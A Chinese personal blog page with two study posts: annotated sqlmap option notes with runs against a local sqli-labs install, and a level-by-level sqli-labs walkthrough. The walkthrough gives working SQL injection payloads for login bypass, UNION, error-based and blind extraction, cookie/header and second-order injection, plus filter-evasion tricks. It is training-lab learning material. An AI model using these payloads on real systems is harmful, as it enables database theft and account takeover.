<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="default">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Hexo">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
</head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-sqlmap" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/08/28/sqlmap/" class="article-date">
  <time datetime="2018-08-28T07:30:54.000Z" itemprop="datePublished">2018-08-28</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/08/28/sqlmap/">sqlmap</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>使用sqlmap需要自己先找到注入点</p>
<h2 id="1-sqlmap-用户文档"><a href="#1-sqlmap-用户文档" class="headerlink" title="1.sqlmap 用户文档"></a>1.sqlmap 用户文档</h2><p>用户文档来自 <a href="https://blog.csdn.net/u012763794/article/details/52638931" target="_blank" rel="noopener">https://blog.csdn.net/u012763794/article/details/52638931</a><br><br>-v VERBOSE 输出信息的详细程度</p>
<pre><code># Verbosity level.
# Valid: integer between 0 and 6
# 0: Show only error and critical messages  只显示错误和关键信息
# 1: Show also warning and info messages    警告和信息
# 2: Show also debug messages               调试信息
# 3: Show also payloads injected            payload，如：[15:32:10] [PAYLOAD] 1)&apos;,(..)&quot;(&quot;
# 4: Show also HTTP requests                整个GET报文都看到了
# 5: Show also HTTP responses&apos; headers         返回报文的头部
# 6: Show also HTTP responses&apos; page content    返回的html代码都有了
# Default: 1
</code></pre><p> Request: 请求<br>    These options can be used to specify how to connect to the target URL</p>
<pre><code>--method=METHOD     Force usage of given HTTP method (e.g. PUT)
    指定HTTP请求的方法，GET，POST，PUT，MOVE等
--data=DATA         Data string to be sent through POST
    指定POST的参数
--param-del=PARA..  Character used for splitting parameter values
    这个拆分一些参数的，如下面用;拆分post参数
    python sqlmap.py -u &quot;http://www.target.com/vuln.php&quot; --data=&quot;query=foobar;id=1&quot; --param-del=&quot;;&quot; -f --banner --dbs --users
--cookie=COOKIE     HTTP Cookie header value
    指定cookie值
--cookie-del=COO..  Character used for splitting cookie values
    指定分割cookie值的字符是什么
--load-cookies=L..  File containing cookies in Netscape/wget format
    这个是从文件中读取cookie吧，Netscape/wget格式的
--drop-set-cookie   Ignore Set-Cookie header from response
    忽略响应包的Set-Cookie头
--user-agent=AGENT  HTTP User-Agent header value
    指定User-Agent用户代理
--random-agent      Use randomly selected HTTP User-Agent header value
    随机选用sqlmap目录中的User-Agent，这个文件再txt目录
--host=HOST         HTTP Host header value
    指定主机头
--referer=REFERER   HTTP Referer header value
    指定Referer头，就是请求来源的意思
-H HEADER, --hea..  Extra header (e.g. &quot;X-Forwarded-For: 127.0.0.1&quot;)
    指定某个头部，如： -H &quot;X-Forwarded-For: 127.0.0.1&quot;
--headers=HEADERS   Extra headers (e.g. &quot;Accept-Language: fr\nETag: 123&quot;)
    这个的话应该是可以指定多个，用\n分割
--auth-type=AUTH..  HTTP authentication type (Basic, Digest, NTLM or PKI)
    指定http认证类型
--auth-cred=AUTH..  HTTP authentication credentials (name:password)
    指定http认证的账户名和密码，就行apache就可以设置访问某个目录时要认证
--auth-file=AUTH..  HTTP authentication PEM cert/private key file
    指定一个私钥文件来认证
--ignore-401        Ignore HTTP Error 401 (Unauthorized)
    忽略401错误
--proxy=PROXY       Use a proxy to connect to the target URL
    指定代理
--proxy-cred=PRO..  Proxy authentication credentials (name:password)
    指定代理的认证信息，就是账号密码
--proxy-file=PRO..  Load proxy list from a file
    从文件中选择代理
--ignore-proxy      Ignore system default proxy settings
    忽略系统默认代理
--tor               Use Tor anonymity network
    使用tor网络
--tor-port=TORPORT  Set Tor proxy port other than default
    设置tor的端口，如果不是默认端口的话
--tor-type=TORTYPE  Set Tor proxy type (HTTP, SOCKS4 or SOCKS5 (default))
    设置tor代理的类型
--check-tor         Check to see if Tor is used properly
    检测tor能不能用
--delay=DELAY       Delay in seconds between each HTTP request
    设置每个HTTP请求的时间间隔，这个在有些限制单位时间请求数的防火墙的时候可以用得到，我上次就用过
--timeout=TIMEOUT   Seconds to wait before timeout connection (default 30)
    设置超时时间，默认30秒
--retries=RETRIES   Retries when the connection timeouts (default 3)
    设置重试的次数，默认3次
--randomize=RPARAM  Randomly change value for given parameter(s)
    随机地更改给定参数的值
--safe-url=SAFEURL  URL address to visit frequently during testing
    有的web应用程序会在你多次访问错误的请求时屏蔽掉你以后的所有请求
    这里提供一个安全不错误的连接，每隔一段时间都会去访问一下
--safe-post=SAFE..  POST data to send to a safe URL
    这里设置一个正确的post数据
--safe-req=SAFER..  Load safe HTTP request from a file
    从文件中读取安全，或者叫正确的http请求
--safe-freq=SAFE..  Test requests between two visits to a given safe URL
    设置访问安全url的时间间隔
--skip-urlencode    Skip URL encoding of payload data
    不进行url编码
--csrf-token=CSR..  Parameter used to hold anti-CSRF token
    设置CSRF的token
--csrf-url=CSRFURL  URL address to visit to extract anti-CSRF token

--force-ssl         Force usage of SSL/HTTPS
    强制使用https
--hpp               Use HTTP parameter pollution method
    尝试了一下，只能用于ASP，得到报错信息如下：
    [WARNING] HTTP parameter pollution should work only against ASP(.NET) targets

--eval=EVALCODE     Evaluate provided Python code before the request (e.g.
                    &quot;import hashlib;id2=hashlib.md5(id).hexdigest()&quot;)
    发送请求之前，先运行这段python代码，比如对某个参数进行处理
    比如下面的，hash参数就是id的md5值
    python sqlmap.py -u &quot;http://www.target.com/vuln.php?id=1&amp;hash=c4ca4238a0b923820dcc
509a6f75849b&quot; --eval=&quot;import hashlib;hash=hashlib.md5(id).hexdigest()&quot;
</code></pre><p>Fingerprint:<br><br>-f, –fingerprint   Perform an extensive DBMS version fingerprint<br>    这个应该是数据库指纹识别，加了可能识别更好<br></p>
<p>Enumeration:<br><br>These options can be used to enumerate the back-end database<br>management system information, structure and data contained in the<br>tables. Moreover you can run your own SQL statements<br><br>-a, –all           Retrieve everything<br><br>    检索所有，这是拖库的节奏啊<br><br>-b, –banner        Retrieve DBMS banner<br><br>    检索数据库的一些标志性的信息，就是指纹这样子吧<br><br>–current-user      Retrieve DBMS current user<br><br>    检索当前连接数据库的用户<br><br>–current-db        Retrieve DBMS current database<br><br>    检索当前连接的数据库<br><br>–hostname          Retrieve DBMS server hostname&lt;/br<br>    检索服务器的主机名<br><br>–is-dba            Detect if the DBMS current user is DBA<br><br>    检测是不是dba，就是root权限咯<br><br>–users             Enumerate DBMS users<br><br>    枚举数据库用户<br><br>–passwords         Enumerate DBMS users password hashes<br><br>    枚举数据库用户的哈希值<br><br>–privileges        Enumerate DBMS users privileges<br><br>    枚举数据库用户的权限<br><br>–roles             Enumerate DBMS users roles<br><br>    枚举数据库用户的角色<br><br>–dbs               Enumerate DBMS databases<br><br>    枚举数据库有哪些<br><br>–tables            Enumerate DBMS database tables<br><br>    枚举数据表名<br><br>–columns           Enumerate DBMS database table columns<br><br>    枚举列名<br><br>–schema            Enumerate DBMS schema<br><br>    这个测试过，将所有的数据库的表的基本信息都枚举了，有哪些列，列的数据类型，具体数据就没有枚举<br><br>–count             Retrieve number of entries for table(s)<br><br>    枚举表格个数<br><br>–dump              Dump DBMS database table entries<br><br>    输出数据库表的数据<br><br>–dump-all          Dump all DBMS databases tables entries<br><br>    输出所有<br><br>–search            Search column(s), table(s) and/or database name(s)<br><br>    查找特定的列名，表名或数据库名，配合下面的-D,-C,-T<br><br>–comments          Retrieve DBMS comments<br><br>    枚举数据库的注释<br><br>-D DB               DBMS database to enumerate<br><br>    指定数据库名<br><br>-T TBL              DBMS database table(s) to enumerate<br><br>    指定表名<br><br>-C COL              DBMS database table column(s) to enumerate<br><br>    指定列名<br><br>-X EXCLUDECOL       DBMS database table column(s) to not enumerate<br><br>    指定不枚举那个列<br><br>-U USER             DBMS user to enumerate<br><br>    枚举用户，但单独用这个参数感觉没什么用啊，这个可能要看源码才能解决了，估计要配合其他参数<br><br>–exclude-sysdbs    Exclude DBMS system databases when enumerating tables<br><br>    枚举时排除系统的数据库<br><br>–pivot-column=P..  Pivot column name<br><br>    以某一列为核心？这个用过没感觉出什么用<br><br>–where=DUMPWHERE   Use WHERE condition while table dumping<br><br>    使用where调试限制table的输出<br><br>–start=LIMITSTART  First query output entry to retrieve<br><br>    指定开始从第几行开始输出，如–start=3，前两行就不输出了<br><br>–stop=LIMITSTOP    Last query output entry to retrieve<br><br>    指定从第几行开始停止输出<br><br>–first=FIRSTCHAR   First query output word character to retrieve<br><br>    指定只输出第几个字符开始输出，盲注才有效，亲测<br><br>–last=LASTCHAR     Last query output word character to retrieve<br><br>    指定只输出第几个字符停止输出，盲注才有效，亲测，跟上面的配合指定范围，<br><br>    如 ：–first 3 –last 5  只输出3到5位置的字符<br><br>–sql-query=QUERY   SQL statement to be executed<br><br>    指定执行我们的sql语句<br><br>–sql-shell         Prompt for an interactive SQL shell<br><br>    返回一个sql的shell<br><br>–sql-file=SQLFILE  Execute SQL statements from given file(s)<br><br>    从文件中读取执行sql语句<br></p>
<h2 id="二-实例"><a href="#二-实例" class="headerlink" title="二.实例"></a>二.实例</h2><pre><code>1.sqlmap -u &quot;http://127.0.0.1:80/sqli-labs/Less-1/?id=1&quot; -b --is-dba --dbs
查看指纹信息/是否dba(root权限)/数据库
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.18
back-end DBMS operating system: Linux Ubuntu
back-end DBMS: MySQL 5.0
banner:    &apos;5.7.23-0ubuntu0.16.04.1&apos;

current user is DBA:    True

available databases [6]:
[*] challenges
[*] information_schema
[*] mysql
[*] performance_schema
[*] security
[*] sys

2.查看security下表名
 sqlmap -u &quot;http://127.0.0.1:80/sqli-labs/Less-1/?id=1&quot; -D security --tables
Database: security
[4 tables]
+----------+
| emails   |
| referers |
| uagents  |
| users    |
+----------+

3.查看列名
sqlmap -u &quot;http://127.0.0.1:80/sqli-labs/Less-1/?id=1&quot; -D security -T users --columns

Database: security
Table: users
[3 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| id       | int(3)      |
| password | varchar(20) |
| username | varchar(20) |
+----------+-------------+

4.获得所有username
sqlmap -u &quot;http://127.0.0.1:80/sqli-labs/Less-1/?id=1&quot; -D security -T users -C username --dump

Database: security
Table: users
[16 entries]
+-----------+
| username  |
+-----------+
| admin     |
| admin#    |
| admin&apos;#   |
| admin1    |
| admin2    |
| admin3    |
| admin4    |
| admin\\&apos;# |
| Angelina  |
| batman    |
| dhakkan   |
| Dumb      |
| Dummy     |
| secure    |
| stupid    |
| superman  |
+-----------+
</code></pre><h3 id="三-技巧等"><a href="#三-技巧等" class="headerlink" title="三.技巧等"></a>三.技巧等</h3><pre><code>1.自动寻找注入点
sqlmap -u &quot;http://127.0.0.1:80/sqli-labs/Less-62/?id=1*&quot; --batch
如上，在可能的注入点后，加上*，将会自动寻找注入
可以加上 --level n（1-5） 参数，越高越全面

2.绕过WAF
--tamper=TAMPER 使用给定的脚本（S）篡改注入数据

3.post注入
--data &quot;id=1&quot;
或 抓取post数据包，保存为txt, -r参数读取文件 -p 要注入的参数
</code></pre>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/08/28/sqlmap/" data-id="cjldemypa0004kkvpgtde74uq" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sqlmap/">sqlmap</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-sql注入" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/08/28/sql注入/" class="article-date">
  <time datetime="2018-08-28T03:30:20.000Z" itemprop="datePublished">2018-08-28</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/08/28/sql注入/">sql注入</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>sql注入:利用现有程序，使之执行构造的payload.</p>
<h3 id="一-环境搭建"><a href="#一-环境搭建" class="headerlink" title="一. 环境搭建"></a>一. 环境搭建</h3><ul>
<li>ubuntu16.04虚拟机</li>
<li>更新阿里源 apt-get update</li>
<li>安装mysql apt-get install mysql-server mysql-client -y</li>
<li>安装apache apt-get install apache2 -y</li>
<li>安装git apt-get install git -y</li>
<li>项目 cd /var/www &amp;&amp; sudo git clone <a href="https://github.com/Audi-1/sqli-labs.git" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs.git</a> sqli-labs  </li>
<li>更改项目的mysql配置文件为自己数据库</li>
<li>现在在浏览器localhost/sqli-labs已经可以访问到了</li>
</ul>
<h5 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h5><ul>
<li>navicat连不上mysql <br><br>  注释 /etc/mysql/mysql.cnf.d/mysqld.cnf 中bind 127.0.0.1<br><br>  修改select user, host from user;  update user set host = “%” where host = ‘localhost’;  flush privileges;</li>
<li>php版本导致mysql_connect()废弃 <br><br>  安装phpstorm 配置phpcgi  apt-get install php版本-cgi<br><br>  降低版本到php5.6错误仍然在<br><br>  第二天重启Phpstrom 打开网页，错误消失<br><br>猜测是降低版本有效，但第一天有缓存<br></li>
</ul>
<h3 id="二-sqli-labs"><a href="#二-sqli-labs" class="headerlink" title="二.sqli-labs"></a>二.sqli-labs</h3><p>参考了大牛的教程<a href="https://github.com/lcamry/sqli-labs/blob/master/mysql-injection.pdf" target="_blank" rel="noopener">https://github.com/lcamry/sqli-labs/blob/master/mysql-injection.pdf</a></p>
<ul>
<li><p><strong> less1 GET-Error based - Single quotes - String <br> </strong><br>  php中代码 SELECT * FROM users WHERE id=’$id’ LIMIT 0,1;<br>  %20 空格 %27 单引号 %3D 等于号<br><br>  一：?id=(select%20id%20from%20users%20where%20username%20%3D”admin”) 未成功      ’$id’ 注入被单引号包裹，将输入变成了字符串<br><br>  二：?id=’%20and%20username%3D%27admin 未成功 id=’’这个条件未绕过<br>  想利用id=这个条件或者绕过这个条件<br><br>  三：?id=’%20or%20username%3D%27admin 成功<br><br>  基于二，转换思路，利用or成功绕过<br><br>  爆破数据库版本<br><br>  ?id=-1%27%20%20union%20select%201%2cversion()%2c3%23<br><br>  ？id=-1’  union select 1,version(),3#<br><br>  union必须列一样，所以1和3是为了保持三列</p>
</li>
<li><p><strong> less 2 GET - Error based -Intiger based<br> </strong><br>  php中代码 $sql=”SELECT * FROM users WHERE id=$id LIMIT 0,1”;<br><br>  $id未加引号过滤输入<br> ?id=(select%20id%20from%20users%20where%20username%20%3D”admin”)成功注入</p>
</li>
<li><p><strong> less 3 GET - Error based - single quotes with twist - string</strong><br><br>  php中代码 $sql=”SELECT * FROM users WHERE id=(‘$id’) LIMIT 0,1”; 用括号和单引号进行了过滤<br><br>  思路：消除括号<br><br>  ?id=%27)or%20username%3D%27admin%27or%20(%27  成功</p>
</li>
</ul>
<ul>
<li><p><strong> less 4  GET - Error based - Double Quotes - String </strong> <br><br>  php中代码<br><br>  $id = ‘“‘ . $id . ‘“‘;<br><br>  $sql=”SELECT * FROM users WHERE id=($id) LIMIT 0,1”;<br><br>  ?id=%27)or%20username%3D%27admin%27or%20(%27 成功<br></p>
<p>  关于前四个less的一些心得：</p>
<pre><code>1.找错误：
    尝试着单引号，双引号，括号等特殊字符注入，如果有报错信息，多半就是该符号出问题
    例：?id=&quot;
             返回You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&quot;&quot;&quot;) LIMIT 0,1&apos; at line 1
        可以看出输入所在位置为（“输入”）
2.注入利用
    通过union来执行自己想要的sql
</code></pre></li>
<li><p><strong> less 5  GET - Double Injection - Single Quotes - String </strong> <br><br>双查询注入（双查询：select嵌套select）<br><br>  输入?id=‘ 失败， use near 1  由此猜测为单引号<br><br>  ?id=’%20or%20username%3D%27admin 成功 <br><br>  但是sql执行结果前端并没有进行输出，怎么利用？<br></p>
<p>  查询资料后发现：Double injection 双注入。一些研究人员发现，使用group by子句结合rand()函数以及像count（*）这样的聚合函数，在SQL查询时会出现错误，这种错误是随机产生的，这就产生了双重查询注入。<br><br>  发现多查询几次会爆出duplicate entry的错误，且将我们需要的信息都爆出来了。（正常结果未返回显示，所以通过错误信息去获得我们想要的信息，有随机性，需要重复多次）<br><br>  count() 计数<br><br>  rand() 随机<br><br>  group by 分组<br><br>  floor() 向下取整，舍弃小数部分<br></p>
<p>  ?id=-1%27%20union%20select%201%2c(select%20count(*)%20from%20information_schema.schemata%20group%20by%20concat(version()%2cfloor(rand(0)*2)))%2c3%20%23 成功<br><br>  Duplicate entry ‘5.7.23-0ubuntu0.16.04.11’ for key ‘’<br>  其中version(）是我们希望执行的函数，可以换成其它</p>
</li>
<li><p><strong> less 6 GET - Double Injection - Double Quotes - String </strong> <br></p>
<p>  ?id=-1%22%20union%20select%201%2c(select%20count(*)%20from%        20information_schema.schemata%20group%20by%20concat(version()%2cfloor(rand(0)*2)))%2c3%20%23 成功</p>
</li>
<li><p><strong> less 7 GET - Dump into outfile - String </strong> <br><br>  文件导入限制条件多，未成功</p>
</li>
<li><p><strong> less 8 GET - Blind - Boolian Based - Single Quotes </strong> <br><br>  ?id=-1%27or%201%3d1%23 <br><br>  利用二分与返回结果的正确与否，来猜测验证数据库内容</p>
</li>
<li><p><strong> less 9 GET - Blind - Time Based - Single Quotes </strong> <br><br>  ?id=1%27%20and%20if(ascii(substr(database(),1,1))&gt;116,%200,%20sleep(5))%20%23 <br><br>  因为在这正确或者错误都是返回的”you are in” 所以不能区分 <br><br><img src="../images/youarein.png" alt="youarein"><br>  使用时间延迟，例子为判断数据库名字第一个字是否为s(ascii码为115)，要进行多次尝试</p>
</li>
<li><p><strong> less 10 GET -Blind - Time Based - Double Quotes </strong> <br><br>  ?id=1”%20and%20if(ascii(substr(database(),1,1))&gt;116,%200,%20sleep(5))%20%23</p>
</li>
<li><p><strong> less 11 POST - Error Based -Single Qoutes - String </strong> <br><br>  username:  </p>
<pre><code>1.admin &apos; # admin用户&lt;/br&gt;
2.adimn &apos; or 1=1 # 万能&lt;/br&gt;
3. &apos; union select version(),1 # 等其它操作
</code></pre><p>  passwd:<br>  因为username已经用#将后面注释了，所以passwd随意输入</p>
</li>
<li><p><strong> less 12 POST - Error Based - Double Quotes - String - with twist </strong> <br><br>将less11的单引号改为 “）</p>
</li>
<li><p><strong> less 13 POST - Double Injection - Single quotes - String - with twist </strong> <br><br>  username:    ‘) union select (select count(*) from information_schema.schemata group by concat(version(),floor(rand(0)*2))),1 #<br><br>  返回信息Duplicate entry ‘5.7.23-0ubuntu0.16.04.11’ for key ‘’<br><br>  另外这种有正确/错误提示的，都可以二分盲注来猜测验证</p>
</li>
<li><p><strong> less 14 POST  - Double Injection - Double quotes - String </strong> <br><br>  less13 ‘) 换为 ”</p>
</li>
<li><p><strong> less 15 POST - Blind - Boolean/Time Based -Single Quotes </strong> <br><br>  username: ‘ or 1=1 # 登录成功 <br><br>  思路：利用or/and/if sleep()等来进行猜测<br></p>
</li>
<li><p><strong> less 16 POST - Blind - Boolean/Time Based - Double Quotes - with twist </strong> <br><br>  将less15 ‘ 换成 “)</p>
</li>
<li><p><strong> less 17 POST - Update Query - Error Based - String </strong> <br><br>  这里对用户名进行了过滤<br><br>  利用报错进行注入输出 <br><br>  uname=admin&amp;passwd=11’and extractvalue(1,concat(0x7e,(select @@version),0x7e))#&amp;sub mit=Submit <br><br>  输出结果XPATH syntax error: ‘~5.7.23-0ubuntu0.16.04.1~’<br><br>报错注入基本都是利用XPath进行报错<br>  有必要去买本书来系统的看一下mysql各种函数</p>
</li>
<li><p><strong> less 18 POST - Header Injection - Uagent field - Error Based </strong> <br><br>  这里需要正确的账号密码才能进行注入，因为插入操作是在登录判断成功后<br><br>  php中语句：$insert=”INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (‘$uagent’, ‘$IP’, $uname)”;<br>其中$IP不好修改，$uname与$password进行了过滤，所以考虑$uagent<br><br>  将User-Agent 修改为 ‘ or extractvalue(1,concat(0x7e,version())) or ’<br><br>  返回结果：XPATH syntax error: ‘~5.7.23-0ubuntu0.16.04.1’</p>
</li>
<li><p><strong> less 19 POST - Header Injection - Referer Field - Error Based </strong> <br><br>  同less 18,进行了过滤，但执行了$insert=”INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (‘$uagent’, ‘$IP’)”;<br><br>  其中：$uagent = $_SERVER[‘HTTP_REFERER’];<br><br>  将Referer 修改为: ‘or extractvalue(1,concat(0x7e,database())) or’<br><br>  返回: XPATH syntax error: ‘~security’</p>
</li>
<li><p><strong> less 20 POST - Cookie Injection - Uagent Field - Error Based </strong> <br><br>  进行了过滤<br><br>  $cookee = $_COOKIE[‘uname’];<br><br>  $sql=”SELECT * FROM users WHERE username=’$cookee’ LIMIT 0,1”;<br><br>  流程是登录成功后产生cookie,此时修改cookie,进行注入(在chrome浏览器中使用tamper插件进行请求的拦截修改)<br><br>  修改Cookie为： uname=-1’ union select 1,(select version()),3 #<br><br>  返回 ：</p>
<pre><code>Your Login name:5.7.23-0ubuntu0.16.04.1
Your Password:3
Your ID:1
</code></pre><p>  也可以用MYSQL对XML文档数据进行查询和修改的XPATH函数，进行报错回显<br><br>   uname=admin’and extractvalue(1,concat(0x7e,(select @@basedir),0x7e))# <br><br>  返回:Issue with your mysql: XPATH syntax error: ‘~/usr/~’</p>
</li>
<li><p><strong> less 21 POST - Cookie Injection - Error Based - Base64 Encode - Single Quotes - String </strong> <br><br>  setcookie(‘uname’, base64_encode($row1[‘username’]), time()+3600);<br>  $sql=”SELECT * FROM users WHERE username=(‘$cookee’) LIMIT 0,1”;<br><br>  对Cookie 进行了 base64处理 <br><br>  uname=LTEnKSB1bmlvbiBzZWxlY3QgMSwoc2VsZWN0IHZlcnNpb24oKSksMyAj<br>  uname=-1’) union select 1,(select version()),3 #<br><br>  返回：<br><br>Your Login name:5.7.23-0ubuntu0.16.04.1<br><br>   Your Password:3<br><br>  Your ID:1</p>
</li>
<li><p><strong> less 22 POST - Cookie Injection - Error Based - Base64 Encode - Double Quotes - String </strong> <br><br>  对Cookie进行了base64编码，使用的双引号</p>
</li>
</ul>
<hr>
<ul>
<li><p><strong> less 23 GET - Error Based - Strip Comments </strong> <br><br>  php中处理：<br><br>  $reg = “/#/“;<br><br>  $reg1 = “/–/“;<br><br>  $replace = “”;<br><br>  $id = preg_replace($reg, $replace, $id); //将$reg替换为$replace<br><br>  $id = preg_replace($reg1, $replace, $id);<br><br>  $sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”;<br><br>  因为过滤了注释符号，所以自己添加引号来闭合,同样可以使用报错/延时注入等<br><br>  ?id=-1%27%20union%20select%201%2c(select%20version())%2c3%20%27<br><br>  返回：<br><br>Your Login name:5.7.23-0ubuntu0.16.04.1<br><br>  Your Password:3</p>
</li>
<li><p><strong> less 24 POST - Second Order Injection *Real treat* - Stored Injections </strong> <br><br>  本关为二次注入的示范例。二次注入也称为存储型的注入，就是将可能导致 sql 注入的字符先存入到数据库中， 当再次调用这个恶意构造的字符时， 就可以触发 sql 注入<br><br>  php中:<br></p>
<pre><code>$sql = &quot;select count(\*) from users where username=&apos;$username&apos;&quot;;
    $res = mysql_query($sql) or die(&apos;You tried to be smart, Try harder!!!! :( &apos;);
    $sql = &quot;insert into users ( username, password) values(\&quot;$username\&quot;, \&quot;$pass\&quot;)&quot;;
    $sql = &quot;UPDATE users SET PASSWORD=&apos;$pass&apos; where username=&apos;$username&apos; and password=&apos;$curr_pass&apos; &quot;;
</code></pre><p>  先注册一个admin’#用户，更改其密码，实际上是更改的admin的密码</p>
</li>
<li><p><strong>less 25 GET - Error Based - All your OR &amp; AND Belong to us - String - Single Quotes</strong><br><br>  $id= preg_replace(‘/or/i’,””, $id);            //strip out OR (non case sensitive)<br><br>  $id= preg_replace(‘/AND/i’,””, $id);        //Strip out AND (non case sensitive)<br><br>  $sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”;<br><br>  思路：使用union<br>  绕过过滤：</p>
<pre><code>（1）大小写变形 Or,OR,oR
（2）编码，hex，urlencode
（3）添加注释/*or*/
（4）利用符号 and=&amp;&amp; or=||
</code></pre><p>  ?id=1%27%20||%20%20extractvalue(1%2cconcat(0x7e%2cversion()))%23<br>  返回：XPATH syntax error: ‘~5.7.23-0ubuntu0.16.04.1’</p>
</li>
<li><p><strong>less 25a GET - Blind Based - All your OR &amp; AND Belong to us - String - Single Quotes</strong> <br><br>  $id= blacklist($id);<br><br>  $sql=”SELECT * FROM users WHERE id=$id LIMIT 0,1”;<br><br>  //print_r(mysql_error()); <br><br>  报错注入不能用，所以使用基于布尔的注入，其中and/or进行了过滤<br><br>  ?id=-1%20||%20if(ascii(substr(database(),1,1))%3d117,0,1)判断数据库名字第一个字符是不是u(users库)<br><br>然后依次这样，查出数据库名</p>
</li>
<li><p><strong>less 26 GETs - Error Based - All your Spaces and Comments Belong to us</strong> <br><br>  Comments 注释<br><br>  php中:<br></p>
<pre><code>function blacklist($id)
 {
 $id= preg_replace(&apos;/or/i&apos;,&quot;&quot;, $id);            //strip out OR (non case sensitive)
 $id= preg_replace(&apos;/and/i&apos;,&quot;&quot;, $id);        //Strip out AND (non case sensitive)
 $id= preg_replace(&apos;/[\/\*]/&apos;,&quot;&quot;, $id);        //strip out /*
 $id= preg_replace(&apos;/[--]/&apos;,&quot;&quot;, $id);        //Strip out --
 $id= preg_replace(&apos;/[#]/&apos;,&quot;&quot;, $id);            //Strip out #
 $id= preg_replace(&apos;/[\s]/&apos;,&quot;&quot;, $id);        //Strip out spaces
 $id= preg_replace(&apos;/[\/\\\\]/&apos;,&quot;&quot;, $id);        //Strip out slashes
 return $id;
}
</code></pre><p>  $sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”;<br><br>  思路：<br><br>注释过滤了可以手动闭合引号，空格过滤<br>  可以使用  %a0  换行，<br><br>/**/ 注释， （） 括号等绕过空格<br><br>  此处注释不能使用，为了使用select时去掉末尾引号，空格也不行<br><br>  id=’111’union(select(1),(version()),(3)） ‘ LIMIT 0,1; 使用括号时，引号还在<br><br>  ?id=111%27union%a0select%a01%2cversion()%2c3||%271使用换行成功</p>
</li>
<li><p><strong>less 26a  GET - Blind Based - All your SPACES And COMMENTS Belong to us - Quotes-Parenthesis</strong> <br><br>  过滤和less26相同<br><br>  $sql=”SELECT * FROM users WHERE id=(‘$id’) LIMIT 0,1”;<br><br>  ?id=111%27)union%a0select%a01%2cversion()%2c3||(%271<br></p>
<p>  思考：在盲注时，我们不知道进行了哪些过滤，可以构造特殊payload,如果返回原结果，则说明是我们所猜测的 %26为&amp;<br><br>  ?id=1%27%26%26%271=1 猜测为’ ‘<br><br>  ?id=1%27)%26%26(%271=1 猜测为（’ ‘）<br><br>  ?id=1%22%26%26%221=1 猜测为 “ “<br><br>  ?id=1%22)%26%26(%221=1 猜测为(“ “)<br><br>  ?id=1)%26%26(1=1  猜测为()<br><br>  ?id=1%26%261=1 无<br><br>等诸如此类<br></p>
</li>
<li><p><strong>less 27 GET - Error Based - All your UNION &amp; SELECT Belong to us - String - Single Quotes</strong><br></p>
<pre><code>function blacklist($id)
{
$id= preg_replace(&apos;/[\/\*]/&apos;,&quot;&quot;, $id);        //strip out /*
$id= preg_replace(&apos;/[--]/&apos;,&quot;&quot;, $id);        //Strip out --.
$id= preg_replace(&apos;/[#]/&apos;,&quot;&quot;, $id);            //Strip out #.
$id= preg_replace(&apos;/[ +]/&apos;,&quot;&quot;, $id);        //Strip out spaces.
$id= preg_replace(&apos;/select/m&apos;,&quot;&quot;, $id);        //Strip out spaces.
$id= preg_replace(&apos;/[ +]/&apos;,&quot;&quot;, $id);        //Strip out spaces.
$id= preg_replace(&apos;/union/s&apos;,&quot;&quot;, $id);        //Strip out union
$id= preg_replace(&apos;/select/s&apos;,&quot;&quot;, $id);        //Strip out select
$id= preg_replace(&apos;/UNION/s&apos;,&quot;&quot;, $id);        //Strip out UNION
$id= preg_replace(&apos;/SELECT/s&apos;,&quot;&quot;, $id);        //Strip out SELECT
